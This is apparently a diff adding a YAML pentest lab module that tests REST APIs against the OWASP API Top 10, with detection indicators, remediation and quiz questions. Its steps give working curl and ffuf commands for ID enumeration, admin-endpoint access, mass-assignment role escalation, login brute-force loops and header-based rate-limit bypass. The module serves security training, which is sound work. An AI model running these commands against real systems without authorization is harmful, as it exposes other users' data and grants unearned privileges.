@@ -1,0 +1,214 @@
+# Category: Web Application Security - API Security
+name: "REST API Security Testing"
+id: "web-api-security-001"
+category: "web_application"
+subcategory: "api_security"
+difficulty: "intermediate"
+estimated_time: "60"
+
+tags:
+  - api-security
+  - rest-api
+  - owasp-api-top10
+  - broken-object-level-auth
+  - bola
+  - mass-assignment
+  - rate-limiting
+  - swagger
+  - openapi
+  - jwt
+  - authentication
+  - burp-suite
+  - postman
+  - mitre-t1190
+  - pentest
+
+description: |
+  Test REST API implementations against the OWASP API Security Top 10.
+  Covers Broken Object Level Authorization (BOLA/IDOR), Broken Function Level
+  Authorization, mass assignment, rate limiting bypass, and excessive data exposure.
+
+learning_objectives:
+  - Test for BOLA/IDOR vulnerabilities in API endpoints
+  - Identify mass assignment vulnerabilities in object creation
+  - Bypass rate limiting and authentication controls
+  - Discover undocumented API endpoints via fuzzing and documentation review
+
+tools:
+  - "burp_suite"
+  - "postman"
+  - "curl"
+  - "kiterunner"
+  - "ffuf"
+  - "python3"
+
+prerequisites:
+  - "API documentation (Swagger/OpenAPI) if available"
+  - "Valid API credentials/tokens for testing"
+  - "Burp Suite proxy configured"
+  - "Written authorization from target owner"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Discover API endpoints and documentation"
+    commands:
+      - "# Check common API doc locations"
+      - "curl -s 'http://[target_url]/api/swagger.json' | python3 -m json.tool | head -50"
+      - "curl -s 'http://[target_url]/api/v1/swagger.json'"
+      - "curl -s 'http://[target_url]/openapi.json'"
+      - "curl -s 'http://[target_url]/api-docs'"
+      - "curl -s 'http://[target_url]/swagger-ui.html'"
+      - "# Fuzz for API endpoints"
+      - "ffuf -u 'http://[target_url]/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc 200,201,204,400,401,403 -o /tmp/api_endpoints.json"
+      - "# Kiterunner for API route discovery"
+      - "kr scan http://[target_url] -w /usr/share/kiterunner/routes-large.kite -o /tmp/kr_results.txt"
+      - "# Extract all endpoints from Swagger"
+      - "curl -s 'http://[target_url]/api/swagger.json' | python3 -c \"import sys,json; spec=json.load(sys.stdin); [print(method.upper(), path) for path,methods in spec.get('paths',{}).items() for method in methods]\""
+    expected_output: "Complete API endpoint inventory with HTTP methods"
+    detection: "High-volume requests to /api/ paths with varying URL structures"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Test for Broken Object Level Authorization (BOLA/IDOR) — API1"
+    commands:
+      - "# Get your own user resource"
+      - "curl -s -H 'Authorization: Bearer [user1_token]' 'http://[target_url]/api/v1/users/[user1_id]'"
+      - "# Try accessing another user's resource"
+      - "curl -s -H 'Authorization: Bearer [user1_token]' 'http://[target_url]/api/v1/users/[user2_id]'"
+      - "# Try sequential ID enumeration"
+      - "for id in $(seq 1 20); do echo -n \"ID $id: \"; curl -s -o /dev/null -w '%{http_code}' -H 'Authorization: Bearer [user1_token]' \"http://[target_url]/api/v1/users/$id\"; echo; done"
+      - "# Test BOLA in nested objects"
+      - "curl -s -H 'Authorization: Bearer [user1_token]' 'http://[target_url]/api/v1/users/[user2_id]/orders'"
+      - "curl -s -H 'Authorization: Bearer [user1_token]' 'http://[target_url]/api/v1/orders/[other_user_order_id]'"
+      - "# UUID-based BOLA (predict or enumerate)"
+      - "curl -s -H 'Authorization: Bearer [user1_token]' 'http://[target_url]/api/v1/documents/[guessed_uuid]'"
+    expected_output: "200 response with another user's data confirms BOLA vulnerability"
+    detection: "API access to resources not owned by authenticated user in access logs"
+
+  - id: "step3"
+    phase: "enumeration"
+    action: "Test for Broken Function Level Authorization — API5"
+    commands:
+      - "# Test admin endpoints with non-admin token"
+      - "curl -s -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v1/admin/users'"
+      - "curl -s -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v1/admin/config'"
+      - "# Test privileged HTTP methods on standard endpoints"
+      - "curl -s -X DELETE -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v1/users/[user2_id]'"
+      - "curl -s -X PUT -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v1/users/[user2_id]' -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}'"
+      - "# Test versioned endpoint bypass"
+      - "curl -s -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v2/admin/users'"
+      - "curl -s -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/internal/users'"
+    expected_output: "Admin functionality accessible with regular user token"
+    detection: "Low-privilege tokens accessing admin API paths in access logs"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Test mass assignment vulnerability — API6"
+    commands:
+      - "# Normal user registration request"
+      - "curl -s -X POST 'http://[target_url]/api/v1/users' -H 'Content-Type: application/json' -d '{\"username\":\"testuser\",\"email\":\"test@test.com\",\"password\":\"Password123\"}'"
+      - "# Inject extra fields — role escalation"
+      - "curl -s -X POST 'http://[target_url]/api/v1/users' -H 'Content-Type: application/json' -d '{\"username\":\"testuser2\",\"email\":\"test2@test.com\",\"password\":\"Password123\",\"role\":\"admin\",\"isAdmin\":true,\"admin\":1}'"
+      - "# Test on profile update endpoint"
+      - "curl -s -X PUT -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v1/users/[user_id]' -H 'Content-Type: application/json' -d '{\"email\":\"updated@test.com\",\"role\":\"admin\",\"verified\":true,\"credits\":99999}'"
+      - "# Verify if elevation worked"
+      - "curl -s -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v1/users/[user_id]' | python3 -m json.tool | grep -i 'role\\|admin\\|credits'"
+    expected_output: "Mass assignment allows setting privileged fields like role, admin, credits"
+    detection: "API requests containing unexpected object properties not in normal schema"
+
+  - id: "step5"
+    phase: "enumeration"
+    action: "Test rate limiting and resource exhaustion — API4"
+    commands:
+      - "# Test login endpoint rate limiting"
+      - "for i in $(seq 1 100); do curl -s -o /dev/null -w '%{http_code} ' -X POST 'http://[target_url]/api/v1/auth/login' -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"wrong\"}'; done"
+      - "# Check for 429 Too Many Requests"
+      - "# Test password reset rate limiting"
+      - "for i in $(seq 1 20); do curl -s -o /dev/null -w '%{http_code} ' -X POST 'http://[target_url]/api/v1/auth/reset' -H 'Content-Type: application/json' -d '{\"email\":\"victim@test.com\"}'; done"
+      - "# Bypass via header manipulation"
+      - "curl -s -X POST 'http://[target_url]/api/v1/auth/login' -H 'X-Forwarded-For: 1.2.3.4' -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"wrong\"}'"
+      - "curl -s -X POST 'http://[target_url]/api/v1/auth/login' -H 'X-Real-IP: 5.6.7.8' -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"wrong\"}'"
+    expected_output: "Missing 429 response = no rate limiting; header bypass = rate limiting misconfigured"
+    detection: "High-volume authentication requests from single IP in API gateway logs"
+
+  - id: "step6"
+    phase: "enumeration"
+    action: "Test excessive data exposure — API3"
+    commands:
+      - "# Get API response and check for sensitive fields"
+      - "curl -s -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v1/users/[user_id]' | python3 -m json.tool"
+      - "# Look for fields not needed by client"
+      - "curl -s -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v1/users/[user_id]' | python3 -c \"import sys,json; data=json.load(sys.stdin); [print(k,':', str(v)[:50]) for k,v in data.items()]\""
+      - "# Compare API response vs UI — fields hidden in UI but present in API?"
+      - "# Check for PII, internal IDs, password hashes in responses"
+      - "curl -s -H 'Authorization: Bearer [user_token]' 'http://[target_url]/api/v1/users' | python3 -m json.tool | grep -iE 'password|hash|secret|ssn|dob|card|token|key'"
+      - "# Test verbose error messages"
+      - "curl -s 'http://[target_url]/api/v1/users/99999999' | python3 -m json.tool"
+      - "curl -s -X POST 'http://[target_url]/api/v1/users' -H 'Content-Type: application/json' -d 'invalid json {{{' | python3 -m json.tool"
+    expected_output: "Sensitive fields (passwords, tokens, PII) present in API responses"
+    detection: "API responses containing sensitive field names in DLP monitoring"
+
+compliance_controls:
+  - standard: "OWASP API Security Top 10 2023"
+    control: "API1-API10"
+    description: "Full OWASP API Security Top 10 assessment"
+  - standard: "OWASP ASVS v4.0"
+    control: "13.1-13.3"
+    description: "Generic API security verification requirements"
+  - standard: "NIST 800-53 Rev5"
+    control: "SI-10"
+    description: "Information input validation"
+  - standard: "PCI DSS v4.0"
+    control: "6.2.4"
+    description: "Prevent common API attacks"
+
+detection:
+  network_indicators:
+    - "Sequential ID enumeration in API GET requests"
+    - "High-volume authentication attempts to API login endpoints"
+    - "API requests containing unexpected JSON properties"
+  log_indicators:
+    - "API gateway: 200 responses for cross-user resource access"
+    - "API logs: admin endpoint access from non-admin tokens"
+    - "API logs: mass assignment attempt — extra JSON fields in request"
+  endpoint_indicators:
+    - "Response payload containing password hashes or internal tokens"
+    - "Admin role appearing in user profile after registration"
+
+remediation:
+  immediate:
+    - "Implement object-level authorization checks on every API endpoint"
+    - "Use allowlist for accepted JSON properties — reject unknown fields"
+    - "Implement rate limiting at API gateway (429 after threshold)"
+    - "Filter API responses to include only fields needed by client"
+  long_term:
+    - "Adopt API design standard with authorization at every layer"
+    - "Deploy API security gateway (AWS API Gateway, Kong, Apigee)"
+    - "Integrate DAST API scanning in CI/CD pipeline"
+    - "Implement API schema validation — reject non-conforming requests"
+
+variables:
+  target_url: "http://target.example.com"
+  user1_token: "eyJhbGc..."
+  user1_id: "1001"
+  user2_id: "1002"
+  user_token: "eyJhbGc..."
+  user_id: "1001"
+  other_user_order_id: "ord_9999"
+  guessed_uuid: "550e8400-e29b-41d4-a716-446655440000"
+
+assessment_questions:
+  - "What is the difference between BOLA and Broken Function Level Authorization?"
+  - "How does mass assignment differ from parameter tampering?"
+  - "What HTTP response code indicates rate limiting is active?"
+  - "Why are API responses often more data-rich than what the UI displays?"
+  - "How does UUID-based ID usage reduce but not eliminate BOLA risk?"
+
+references:
+  - url: "https://owasp.org/API-Security/editions/2023/en/0x00-header/"
+    title: "OWASP API Security Top 10 2023"
+  - url: "https://github.com/assetnote/kiterunner"
+    title: "Kiterunner API Discovery"
+  - url: "https://portswigger.net/web-security/api-testing"
+    title: "PortSwigger API Testing"
